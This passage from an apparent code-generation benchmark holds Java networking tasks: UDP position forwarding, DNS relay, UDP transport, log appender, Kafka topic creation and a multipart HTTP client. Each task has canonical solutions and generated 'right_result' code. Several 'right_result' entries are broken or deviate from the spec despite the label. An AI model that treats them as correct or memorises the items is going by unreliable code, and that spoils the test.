    "right_result": "import java.io.*;\nimport java.net.*;\n\npublic class GreysConsole {\n    private Socket socket;\n    private BufferedWriter socketWriter;\n    private BufferedReader socketReader;\n    private boolean isRunning;\n\n    public Socket connect(InetSocketAddress address) {\n        try {\n            socket = new Socket();\n            socket.connect(address);\n            socket.setSoTimeout(5000);\n            socketWriter = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));\n            socketReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            isRunning = true;\n            return socket;\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    public void shutdown() {\n        try {\n            if (socket != null) {\n                socket.close();\n            }\n            if (socketWriter != null) {\n                socketWriter.close();\n            }\n            if (socketReader != null) {\n                socketReader.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        isRunning = false;\n    }\n\n    public GreysConsole(InetSocketAddress address) {\n        this.socket = connect(address);\n    }\n}"
  },
  {
    "Task_id": 591,
    "Instruction": "Here is the structured instruction for the given class-level reference code:\n\nTask Description: Implement a UDP-based position forwarding service that sends GPS position data in Wialon protocol format to a specified server.\n\nClass Description: PositionForwarderWialon is a class that handles the forwarding of position data to a remote server using UDP. It formats the position data according to the Wialon protocol, manages the UDP socket connection, and provides methods for sending position data and handling results.\n\nAttributes:\n- socket: DatagramSocket - The UDP socket used for communication\n- address: InetAddress - The target server's IP address\n- port: int - The target server's port number\n\nMethods:\n- PositionForwarderWialon(Config config, ExecutorService executorService) -> void - Constructor that initializes the UDP connection. Takes a configuration object and an executor service for background packet receiving.\n- sendPosition(Position position, String uniqueId, ResultHandler resultHandler) -> void - Formats and sends position data to the server. Takes a Position object, device unique ID, and a callback handler for results.\n- compressData(byte[] data) -> ByteBuf - Static method that compresses data using Deflater. Takes a byte array and returns a compressed ByteBuf.\n- formatAttributes(Map<String, Object> attributes) -> String - Static helper method that formats position attributes into a string. Takes a map of attributes and returns a formatted string.\n\nInterface:\n- ResultHandler: Functional interface with onResult(boolean success, Throwable throwable) method for handling send operation results.",
    "Canonical_solution": "import io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport org.traccar.config.Config;\nimport org.traccar.config.Keys;\nimport org.traccar.helper.Checksum;\nimport org.traccar.helper.UnitsConverter;\nimport org.traccar.model.Position;\n\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.nio.ByteBuffer;\nimport java.nio.charset.StandardCharsets;\nimport java.text.DateFormat;\nimport java.text.SimpleDateFormat;\nimport java.util.Map;\nimport java.util.TimeZone;\nimport java.util.concurrent.ExecutorService;\nimport java.util.stream.Collectors;\nimport java.util.zip.Deflater;\n\npublic class PositionForwarderWialon {\n\n    private final DatagramSocket socket;\n    private final InetAddress address;\n    private final int port;\n\n    public PositionForwarderWialon(Config config, ExecutorService executorService) {\n        try {\n            URI url = new URI(config.getString(Keys.FORWARD_URL));\n            address = InetAddress.getByName(url.getHost());\n            port = url.getPort();\n            socket = new DatagramSocket();\n            executorService.submit(() -> {\n                byte[] buffer = new byte[1024];\n                while (!executorService.isShutdown()) {\n                    try {\n                        socket.receive(new DatagramPacket(buffer, buffer.length));\n                    } catch (IOException e) {\n                        throw new RuntimeException(e);\n                    }\n                }\n            });\n        } catch (IOException | URISyntaxException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public void sendPosition(Position position, String uniqueId, ResultHandler resultHandler) {\n        DateFormat dateFormat = new SimpleDateFormat(\"ddMMyy;HHmmss\");\n        dateFormat.setTimeZone(TimeZone.getTimeZone(\"UTC\"));\n\n        String payload = String.format(\n                \"%s;%02d%.5f;%s;%03d%.5f;%s;%d;%d;%d;NA;NA;NA;NA;;%s;%s\",\n                dateFormat.format(position.getFixTime()),\n                (int) Math.abs(position.getLatitude()),\n                Math.abs(position.getLatitude()) % 1 * 60,\n                position.getLatitude() >= 0 ? \"N\" : \"S\",\n                (int) Math.abs(position.getLongitude()),\n                Math.abs(position.getLongitude()) % 1 * 60,\n                position.getLongitude() >= 0 ? \"E\" : \"W\",\n                (int) UnitsConverter.kphFromKnots(position.getSpeed()),\n                (int) position.getCourse(),\n                (int) position.getAltitude(),\n                position.getString(Position.KEY_DRIVER_UNIQUE_ID, \"NA\"),\n                formatAttributes(position.getAttributes()));\n\n        String message = uniqueId + \"#D#\" + payload + \"\\r\\n\";\n        byte[] buffer = message.getBytes();\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, port);\n\n        try {\n            socket.send(packet);\n            resultHandler.onResult(true, null);\n        } catch (IOException e) {\n            resultHandler.onResult(false, e);\n        }\n    }\n\n    public static ByteBuf compressData(byte[] data) {\n        ByteBuf container;\n        Deflater deflater = new Deflater();\n        deflater.setInput(data);\n        deflater.finish();\n\n        ByteBuf compressedData = Unpooled.buffer(data.length);\n        byte[] tempBuffer = new byte[1024];\n\n        try {\n            while (!deflater.finished()) {\n                int count = deflater.deflate(tempBuffer);\n                compressedData.writeBytes(tempBuffer, 0, count);\n            }\n            container = Unpooled.buffer(3 + compressedData.readableBytes());\n            container.writeByte(0xFF);\n            container.writeShortLE(compressedData.readableBytes());\n            container.writeBytes(compressedData);\n        } finally {\n            deflater.end();\n            compressedData.release();\n        }\n\n        return container;\n    }\n\n    public static String formatAttributes(Map<String, Object> attributes) {\n        if (attributes.isEmpty()) {\n            return \"NA\";\n        }\n        return attributes.entrySet().stream()\n                .map(entry -> {\n                    Object value = entry.getValue();\n                    int type;\n                    if (value instanceof Double || value instanceof Float) {\n                        type = 2;\n                    } else if (value instanceof Number) {\n                        type = 1;\n                    } else {\n                        type = 3;\n                    }\n                    return entry.getKey() + \":\" + type + \":\" + value;\n                })\n                .collect(Collectors.joining(\",\"));\n    }\n\n    public interface ResultHandler {\n        void onResult(boolean success, Throwable throwable);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "import java.net.*;\nimport java.util.*;\nimport java.nio.charset.StandardCharsets;\nimport java.util.concurrent.ExecutorService;\n\npublic class PositionForwarderWialon {\n    private DatagramSocket socket;\n    private InetAddress address;\n    private int port;\n\n    public PositionForwarderWialon(Config config, ExecutorService executorService) {\n        this.address = InetAddress.getByName(config.getServerAddress());\n        this.port = config.getServerPort();\n        this.socket = new DatagramSocket();\n    }\n\n    public void sendPosition(Position position, String uniqueId, ResultHandler resultHandler) {\n        try {\n            String positionData = buildPositionData(position);\n            String attributesString = formatAttributes(position.getAttributes());\n            String fullMessage = positionData + \";\" + attributesString;\n            byte[] data = fullMessage.getBytes(StandardCharsets.UTF_8);\n            ByteBuf compressedData = compressData(data);\n            byte[] compressedBytes = compressedData.array();\n            DatagramPacket packet = new DatagramPacket(compressedBytes, compressedBytes.length, address, port);\n            socket.send(packet);\n            resultHandler.onResult(true, null);\n        } catch (Exception e) {\n            resultHandler.onResult(false, e);\n        }\n    }\n\n    private static ByteBuf compressData(byte[] data) {\n        Deflater deflater = new Deflater();\n        deflater.setInput(data);\n        deflater.finish();\n        byte[] compressed = new byte[data.length];\n        int compressedLength = deflater.deflate(compressed);\n        deflater.end();\n        return Unpooled.wrappedBuffer(compressed, 0, compressedLength);\n    }\n\n    private static String formatAttributes(Map<String, Object> attributes) {\n        if (attributes == null || attributes.isEmpty()) {\n            return \"\";\n        }\n        StringBuilder sb = new StringBuilder();\n        for (Map.Entry<String, Object> entry : attributes.entrySet()) {\n            sb.append(entry.getKey()).append(\"=\").append(entry.getValue()).append(\";\");\n        }\n        if (sb.length() > 0) {\n            sb.setLength(sb.length() - 1);\n        }\n        return sb.toString();\n    }\n\n    private String buildPositionData(Position position) {\n        return \"lat=\" + position.getLatitude() + \";lon=\" + position.getLongitude() + \";time=\" + position.getTime();\n    }\n}"
  },
  {
    "Task_id": 592,
    "Instruction": "Task Description: Implement a DNS resolver class that handles UDP communication for DNS query processing, sending DNS payloads to a specified local port and receiving responses.\n\nClass Description: The DNSResolver class provides functionality to send DNS query payloads via UDP to a local port and receive the corresponding DNS responses. It handles the creation of UDP sockets and packets for communication.\n\nAttributes:\nmPort: int - The local port number to which DNS queries will be sent\nmLocalhost: InetAddress - The local host address used for UDP communication\n\nMethods:\nDNSResolver(int localPort) -> void - Constructor that initializes the DNS resolver with the specified local port number\nprocessDNS(byte[] payload) -> byte[] - Sends the given DNS payload to the configured local port via UDP and returns the received DNS response\n    - Input: payload (byte[]) - The DNS query payload to be sent\n    - Output: byte[] - The received DNS response data",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class DNSResolver {\n\n    private final int mPort;\n    private InetAddress mLocalhost = null;\n\n    public DNSResolver(int localPort) {\n        mPort = localPort;\n    }\n\n    public byte[] processDNS(byte[] payload) throws IOException {\n        if (mLocalhost == null) mLocalhost = InetAddress.getLocalHost();\n\n        DatagramPacket packet = new DatagramPacket(payload, payload.length, mLocalhost, mPort);\n        DatagramSocket datagramSocket = new DatagramSocket();\n        datagramSocket.send(packet);\n\n        byte[] buf = new byte[1024];\n        packet = new DatagramPacket(buf, buf.length);\n        datagramSocket.receive(packet);\n        datagramSocket.close();\n\n        return packet.getData();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "import java.net.*;\nimport java.io.*;\n\npublic class DNSResolver {\n    private int mPort;\n    private InetAddress mLocalhost;\n    private DatagramSocket socket;\n\n    public DNSResolver(int localPort) throws Exception {\n        mPort = localPort;\n        mLocalhost = InetAddress.getLocalHost();\n        socket = new DatagramSocket(mPort);\n    }\n\n    public byte[] processDNS(byte[] payload) throws Exception {\n        DatagramPacket sendPacket = new DatagramPacket(payload, payload.length);\n        InetAddress remoteServer = InetAddress.getByName(\"8.8.8.8\");\n        int remotePort = 53;\n        sendPacket.setAddress(remoteServer);\n        sendPacket.setPort(remotePort);\n        socket.send(sendPacket);\n\n        byte[] responseBuffer = new byte[1024];\n        DatagramPacket receivePacket = new DatagramPacket(responseBuffer, responseBuffer.length);\n        socket.receive(receivePacket);\n\n        byte[] response = new byte[receivePacket.getLength()];\n        System.arraycopy(receivePacket.getData(), 0, response, 0, receivePacket.getLength());\n        return response;\n    }\n}"
  },
  {
    "Task_id": 593,
    "Instruction": "Task Description: Implement a UDP-based transport class for inter-process communication that can function as either a server or client, handling both sending and receiving of datagram packets.\n\nClass Description: UdpTransport is a class that provides UDP communication capabilities, allowing processes to send and receive datagram packets. It can be configured as either a server (listening on a specific port) or a client (sending to a server). The class maintains a list of cluster members and supports asynchronous packet reception through a dedicated receiver thread.\n\nAttributes:\n- sock: DatagramSocket - The UDP socket used for communication\n- receiver_thread: Receiver - Thread for handling incoming packets\n- receiver: RtReceiver - Callback interface for received packets\n- host: InetAddress - The host address for communication\n- port: int - The port number for communication (default: 7800)\n- server: boolean - Flag indicating whether this instance is a server\n- log: Log - Logger instance for logging messages\n- members: List<SocketAddress> - List of cluster member addresses\n\nMethods:\n- receiver(RtReceiver) -> void - Sets the receiver callback for incoming packets\n- localAddress() -> Object - Returns the local socket address\n- clusterMembers() -> List<? extends Object> - Returns the list of cluster members\n- start(String...) -> void - Initializes the transport with given options and starts the receiver thread\n- stop() -> void - Stops the transport and closes the socket\n- send(Object, byte[], int, int) -> void - Sends a datagram packet to the specified destination\n- Receiver.run() -> void - Internal thread method that continuously receives packets (private class method)",
    "Canonical_solution": "import org.jgroups.logging.Log;\nimport org.jgroups.logging.LogFactory;\nimport org.jgroups.tests.RoundTrip;\nimport org.jgroups.tests.rt.RtReceiver;\nimport org.jgroups.tests.rt.RtTransport;\nimport org.jgroups.util.Util;\n\nimport java.io.IOException;\nimport java.net.*;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class UdpTransport implements RtTransport {\n    protected DatagramSocket      sock;\n    protected Receiver            receiver_thread;\n    protected RtReceiver          receiver;\n    protected InetAddress         host;\n    protected int                 port=7800;\n    protected boolean             server;\n    protected final Log           log=LogFactory.getLog(UdpTransport.class);\n    protected List<SocketAddress> members=new ArrayList<>();\n\n    public UdpTransport() {\n    }\n\n    public void receiver(RtReceiver receiver) {\n        this.receiver=receiver;\n    }\n\n    public Object localAddress() {return members != null? members.get(0) : null;}\n\n    public List<? extends Object> clusterMembers() {\n        return members;\n    }\n\n    public void start(String ... options) throws Exception {\n        options(options);\n        if(server) {\n            sock=new DatagramSocket(port, host);\n            System.out.println(\"server started (ctrl-c to kill)\");\n        }\n        else {\n            sock=new DatagramSocket();\n            members.add(sock.getLocalSocketAddress());\n            members.add(new InetSocketAddress(host, port));\n        }\n        receiver_thread=new Receiver();\n        receiver_thread.start();\n    }\n\n    public void stop() {\n        Util.close(sock);\n    }\n\n    public void send(Object dest, byte[] buf, int offset, int length) throws Exception {\n        DatagramPacket packet=new DatagramPacket(buf, offset, length, (SocketAddress)dest);\n        sock.send(packet);\n    }\n\n    protected class Receiver extends Thread {\n        public void run() {\n            byte[] buf=new byte[RoundTrip.PAYLOAD];\n            DatagramPacket packet=new DatagramPacket(buf, 0, buf.length);\n            for(;;) {\n                try {\n                    sock.receive(packet);\n                    if(packet.getLength() != RoundTrip.PAYLOAD)\n                        throw new IllegalStateException(\"expected \" + RoundTrip.PAYLOAD + \" bytes, but got only \" + packet.getLength());\n                    if(receiver != null)\n                        receiver.receive(packet.getSocketAddress(), buf, packet.getOffset(), packet.getLength());\n                }\n                catch(IOException ex) {\n                    break;\n                }\n                catch(Exception e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "import java.net.*;\nimport java.util.*;\n\npublic class UdpTransport {\n    private DatagramSocket sock;\n    private Thread receiver_thread;\n    private RtReceiver receiver;\n    private InetAddress host;\n    private int port = 7800;\n    private boolean server;\n    private Log log;\n    private List<SocketAddress> members;\n\n    public void receiver(RtReceiver r) {\n        this.receiver = r;\n    }\n\n    public Object localAddress() {\n        return sock.getLocalSocketAddress();\n    }\n\n    public List<? extends Object> clusterMembers() {\n        return members;\n    }\n\n    public void start(String... options) {\n        try {\n            if (server) {\n                sock = new DatagramSocket(port);\n                sock.bind(new InetSocketAddress(host, port));\n            } else {\n                sock = new DatagramSocket();\n                sock.connect(new InetSocketAddress(host, port));\n            }\n        } catch (Exception e) {\n            log.error(\"Failed to initialize transport\", e);\n        }\n        receiver_thread = new Thread(() -> {\n            while (true) {\n                try {\n                    byte[] buffer = new byte[1024];\n                    DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n                    sock.receive(packet);\n                    if (receiver != null) {\n                        receiver.onReceive(packet);\n                    }\n                } catch (Exception e) {\n                    log.error(\"Error receiving packet\", e);\n                }\n            }\n        });\n        receiver_thread.start();\n    }\n\n    public void stop() {\n        if (sock != null) {\n            sock.close();\n        }\n    }\n\n    public void send(Object data, byte[] buffer, int offset, int length) {\n        try {\n            DatagramPacket packet = new DatagramPacket(buffer, offset, length);\n            sock.send(packet);\n        } catch (Exception e) {\n            log.error(\"Error sending packet\", e);\n        }\n    }\n\n    private class Receiver implements Runnable {\n        @Override\n        public void run() {\n            // Internal thread method\n        }\n    }\n}"
  },
  {
    "Task_id": 596,
    "Instruction": "Task Description: Create a UDP communication class that can function as either a server or client, handling packet transmission and reception with proper error handling and resource management.\n\nClass Description: UDPCommunicator is a class that encapsulates UDP communication functionality, allowing an instance to operate as either a server (receiving packets) or client (sending packets). The class manages socket creation, packet transmission/reception, and proper cleanup.\n\nAttributes:\n- socket: DatagramSocket - The underlying UDP socket used for communication\n- isServer: boolean - Flag indicating whether this instance operates as a server (true) or client (false)\n\nMethods:\n- UDPCommunicator(boolean isServer, int port) -> void - Constructor that initializes the UDP socket. Binds to specified port if operating as server.\n- sendPacket(byte[] data, String destAddress, int destPort) -> void - Sends a UDP packet to the specified destination (client mode only). Throws IOException on network errors and IllegalStateException if called in server mode.\n- receivePacket() -> byte[] - Receives a UDP packet (server mode only). Returns the packet data as byte array. Throws IOException on network errors and IllegalStateException if called in client mode.\n- close() -> void - Closes the socket and releases system resources. Safe to call multiple times.",
    "Canonical_solution": "import java.net.DatagramSocket;\nimport java.net.DatagramPacket;\nimport java.net.InetSocketAddress;\nimport java.net.SocketException;\nimport java.io.IOException;\n\npublic class UDPCommunicator {\n    private DatagramSocket socket;\n    private boolean isServer;\n\n    public UDPCommunicator(boolean isServer, int port) throws SocketException {\n        this.isServer = isServer;\n        this.socket = new DatagramSocket(null);\n        if (isServer) {\n            socket.bind(new InetSocketAddress(\"0.0.0.0\", port));\n        }\n    }\n\n    public void sendPacket(byte[] data, String destAddress, int destPort) throws IOException {\n        if (isServer) {\n            throw new IllegalStateException(\"Server cannot send packets without first receiving\");\n        }\n        DatagramPacket packet = new DatagramPacket(data, data.length, \n            new InetSocketAddress(destAddress, destPort));\n        socket.send(packet);\n    }\n\n    public byte[] receivePacket() throws IOException {\n        if (!isServer) {\n            throw new IllegalStateException(\"Client should not be receiving packets\");\n        }\n        byte[] buffer = new byte[800];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        socket.receive(packet);\n        return packet.getData();\n    }\n\n    public void close() {\n        if (socket != null && !socket.isClosed()) {\n            socket.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.InetAddress;\nimport java.net.SocketException;\nimport java.net.UnknownHostException;\n\npublic class UDPCommunicator {\n    private DatagramSocket socket;\n    private boolean isServer;\n\n    public UDPCommunicator(boolean isServer, int port) {\n        this.isServer = isServer;\n        try {\n            socket = new DatagramSocket();\n            if (isServer) {\n                socket.bind(new InetSocketAddress(port));\n            }\n        } catch (IOException e) {\n            // Handle exception, but constructor does not throw\n        }\n    }\n\n    public void sendPacket(byte[] data, String destAddress, int destPort) throws IOException {\n        if (isServer) {\n            throw new IllegalStateException(\"Cannot send as server\");\n        }\n        if (data == null || data.length == 0) {\n            throw new IllegalArgumentException(\"Data cannot be null or empty\");\n        }\n        InetAddress address = InetAddress.getByName(destAddress);\n        DatagramPacket packet = new DatagramPacket(data, data.length, address, destPort);\n        socket.send(packet);\n    }\n\n    public byte[] receivePacket() throws IOException {\n        if (!isServer) {\n            throw new IllegalStateException(\"Cannot receive as client\");\n        }\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        socket.receive(packet);\n        return java.util.Arrays.copyOf(packet.getData(), packet.getLength());\n    }\n\n    public void close() {\n        if (socket != null) {\n            try {\n                socket.close();\n            } catch (IOException e) {\n                // Ignore if already closed\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 599,
    "Instruction": "Task Description: Create a Java class that implements a UDP-based output stream appender for logging purposes, capable of sending log messages to a specified host and port via UDP packets.\n\nClass Description: DropwizardUdpSocketAppender is a specialized OutputStreamAppender that sends log messages over UDP to a remote server. It extends OutputStreamAppender to provide UDP socket functionality while maintaining compatibility with logging frameworks.\n\nAttributes:\n- host: String - The target hostname or IP address where UDP packets should be sent\n- port: int - The target port number on the remote host\n\nMethods:\n- DropwizardUdpSocketAppender(String host, int port) -> None - Constructor that initializes the appender with target host and port information\n- start() -> void - Initializes the output stream and starts the appender (overrides parent method)\n- datagramSocketOutputStream(String host, int port) -> OutputStream - Creates and returns a custom OutputStream implementation that sends data via UDP packets\n\nThe custom OutputStream implementation includes:\n- write(int b) -> void - Throws UnsupportedOperationException as UDP doesn't support byte-level writes\n- write(byte[] b, int off, int len) -> void - Sends the specified bytes as a UDP packet to the configured host and port\n- close() -> void - Closes the underlying DatagramSocket",
    "Canonical_solution": "import ch.qos.logback.core.OutputStreamAppender;\nimport ch.qos.logback.core.spi.DeferredProcessingAware;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.SocketException;\n\npublic class DropwizardUdpSocketAppender<E extends DeferredProcessingAware> extends OutputStreamAppender<E> {\n\n    private final String host;\n    private final int port;\n\n    public DropwizardUdpSocketAppender(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    @Override\n    public void start() {\n        setOutputStream(datagramSocketOutputStream(host, port));\n        super.start();\n    }\n\n    protected OutputStream datagramSocketOutputStream(String host, int port) {\n        try {\n            return new OutputStream() {\n                private final DatagramSocket datagramSocket = new DatagramSocket();\n\n                @Override\n                public void write(int b) throws IOException {\n                    throw new UnsupportedOperationException(\"Datagram doesn't work at byte level\");\n                }\n\n                @Override\n                public void write(byte[] b, int off, int len) throws IOException {\n                    datagramSocket.send(new DatagramPacket(b, off, len, InetAddress.getByName(host), port));\n                }\n\n                @Override\n                public void close() throws IOException {\n                    datagramSocket.close();\n                }\n            };\n        } catch (SocketException e) {\n            throw new IllegalStateException(\"Unable to create a datagram socket\", e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "import java.io.OutputStream;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.SocketException;\n\npublic class DropwizardUdpSocketAppender extends OutputStreamAppender {\n    private String host;\n    private int port;\n    private DatagramSocket socket;\n\n    public DropwizardUdpSocketAppender(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    @Override\n    public void start() {\n        try {\n            socket = new DatagramSocket();\n        } catch (SocketException e) {\n            e.printStackTrace();\n        }\n        setOutputStream(new UdpOutputStream());\n    }\n\n    private class UdpOutputStream extends OutputStream {\n        private final DatagramSocket socket;\n\n        public UdpOutputStream() {\n            this.socket = socket;\n        }\n\n        @Override\n        public void write(int b) throws IOException {\n            throw new UnsupportedOperationException(\"UDP doesn't support byte-level writes\");\n        }\n\n        @Override\n        public void write(byte[] b, int off, int len) throws IOException {\n            DatagramPacket packet = new DatagramPacket(b, off, off + len);\n            InetAddress address = InetAddress.getByName(host);\n            packet.setAddress(address);\n            packet.setPort(port);\n            socket.send(packet);\n        }\n\n        @Override\n        public void close() throws IOException {\n            if (socket != null) {\n                socket.close();\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 6,
    "Instruction": "Task Description: Create a Kafka topic using the AdminClient API in Java.\n\nFunction Description: This function creates a new Kafka topic with the specified name, number of partitions, and replication factor. It uses the Kafka AdminClient to interact with the Kafka broker and handles potential exceptions during the topic creation process.\n\nInput: \n- topic: String - The name of the Kafka topic to be created.\n\nOutput: \n- void - The function does not return any value but creates the topic in Kafka and stores the AdminClient instance in the class field.\n\nExceptions:\n- InterruptedException: If the thread is interrupted while waiting for the topic creation to complete.\n- ExecutionException: If the topic creation fails during execution.\n- TimeoutException: If the topic creation takes longer than the specified timeout period.",
    "Canonical_solution": "import org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.AdminClientConfig;\nimport org.apache.kafka.clients.admin.NewTopic;\nimport java.util.Collection;\nimport java.util.Collections;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.TimeoutException;\nimport wiremock.com.google.common.collect.ImmutableMap;\n\nprivate AdminClient adminClient;\n\nprivate void createTopic(String topic) throws InterruptedException, ExecutionException, TimeoutException {\n    AdminClient adminClient = AdminClient\n        .create(ImmutableMap.of(AdminClientConfig.BOOTSTRAP_SERVERS_CONFIG, kafkaContainer.getBootstrapServers()));\n    Collection<NewTopic> topics = Collections.singletonList(new NewTopic(topic, 3, (short) 1));\n    adminClient.createTopics(topics).all().get(30, TimeUnit.SECONDS);\n    this.adminClient = adminClient;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 34,
    "right_result": "import org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.NewTopic;\nimport java.util.List;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.Future;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.TimeoutException;\n\npublic class KafkaAdmin {\n    private AdminClient adminClient;\n    private int partitions;\n    private int replicationFactor;\n\n    public void createTopic(String topic) {\n        NewTopic newTopic = new NewTopic(topic, partitions, replicationFactor);\n        List<NewTopic> topics = List.of(newTopic);\n        Future<Void> future = adminClient.createTopics(topics).toCompletableFuture();\n        try {\n            future.get(30, TimeUnit.SECONDS);\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            throw e;\n        } catch (ExecutionException e) {\n            throw e;\n        } catch (TimeoutException e) {\n            throw e;\n        }\n    }\n\n    public KafkaAdmin(AdminClient adminClient, int partitions, int replicationFactor) {\n        this.adminClient = adminClient;\n        this.partitions = partitions;\n        this.replicationFactor = replicationFactor;\n    }\n}"
  },
  {
    "Task_id": 60,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality for downloading images and handling multipart form data submissions.\n\nClass Description: The HttpClient class provides methods to download images via HTTP POST requests and to construct and send multipart form data (including both text parameters and file attachments) to a server. It handles connection management, request configuration, and response processing.\n\nAttributes:\n- url: String - The target URL for HTTP requests\n- con: HttpURLConnection - The HTTP connection object\n- os: OutputStream - Output stream for writing request data\n- delimiter: String - Boundary delimiter for multipart form data (default \"--\")\n- boundary: String - Unique boundary string for multipart requests (generated with timestamp)\n\nMethods:\n- HttpClient(String url) -> None - Constructor that initializes the client with target URL\n- downloadImage(String imgName) -> byte[] - Downloads an image by sending the image name as a POST parameter and returns the image data as byte array\n- connectForMultipart() -> void - Initializes connection for multipart form data submission\n- addFormPart(String paramName, String value) -> void - Adds a text parameter to multipart form data\n- addFilePart(String paramName, String fileName, byte[] data) -> void - Adds a file attachment to multipart form data\n- finishMultipart() -> void - Finalizes the multipart form data construction\n- getResponse() -> String - Retrieves and returns the server response as a string\n- writeParamData(String paramName, String value) -> void - Internal helper method for writing form parameters",
    "Canonical_solution": "import java.io.ByteArrayOutputStream;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpClient {\n    private String url;\n    private HttpURLConnection con;\n    private OutputStream os;\n    \n    private String delimiter = \"--\";\n    private String boundary =  \"SwA\"+Long.toString(System.currentTimeMillis())+\"SwA\";\n\n    public HttpClient(String url) {        \n        this.url = url;\n    }\n    \n    public byte[] downloadImage(String imgName) {\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        try {\n            HttpURLConnection con = (HttpURLConnection) ( new URL(url)).openConnection();\n            con.setRequestMethod(\"POST\");\n            con.setDoInput(true);\n            con.setDoOutput(true);\n            con.connect();\n            con.getOutputStream().write( (\"name=\" + imgName).getBytes());\n            \n            InputStream is = con.getInputStream();\n            byte[] b = new byte[1024];\n            \n            while ( is.read(b) != -1)\n                baos.write(b);\n            \n            con.disconnect();\n        }\n        catch(Throwable t) {\n            t.printStackTrace();\n        }\n        \n        return baos.toByteArray();\n    }\n\n    public void connectForMultipart() throws Exception {\n        con = (HttpURLConnection) ( new URL(url)).openConnection();\n        con.setRequestMethod(\"POST\");\n        con.setDoInput(true);\n        con.setDoOutput(true);\n        con.setRequestProperty(\"Connection\", \"Keep-Alive\");\n        con.setRequestProperty(\"Content-Type\", \"multipart/form-data; boundary=\" + boundary);\n        con.connect();\n        os = con.getOutputStream();\n    }\n    \n    public void addFormPart(String paramName, String value) throws Exception {\n        writeParamData(paramName, value);\n    }\n    \n    public void addFilePart(String paramName, String fileName, byte[] data) throws Exception {\n        os.write( (delimiter + boundary + \"\\r\\n\").getBytes());\n        os.write( (\"Content-Disposition: form-data; name=\\\"\" + paramName +  \"\\\"; filename=\\\"\" + fileName + \"\\\"\\r\\n\"  ).getBytes());\n        os.write( (\"Content-Type: application/octet-stream\\r\\n\"  ).getBytes());\n        os.write( (\"Content-Transfer-Encoding: binary\\r\\n\"  ).getBytes());\n        os.write(\"\\r\\n\".getBytes());\n   \n        os.write(data);\n        \n        os.write(\"\\r\\n\".getBytes());\n    }\n    \n    public void finishMultipart() throws Exception {\n        os.write( (delimiter + boundary + delimiter + \"\\r\\n\").getBytes());\n    }\n    \n    public String getResponse() throws Exception {\n        InputStream is = con.getInputStream();\n        byte[] b1 = new byte[1024];\n        StringBuffer buffer = new StringBuffer();\n        \n        while ( is.read(b1) != -1)\n            buffer.append(new String(b1));\n        \n        con.disconnect();\n        \n        return buffer.toString();\n    }\n    \n    private void writeParamData(String paramName, String value) throws Exception {\n        os.write( (delimiter + boundary + \"\\r\\n\").getBytes());\n        os.write( \"Content-Type: text/plain\\r\\n\".getBytes());\n        os.write( (\"Content-Disposition: form-data; name=\\\"\" + paramName + \"\\\"\\r\\n\").getBytes());;\n        os.write( (\"\\r\\n\" + value + \"\\r\\n\").getBytes());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
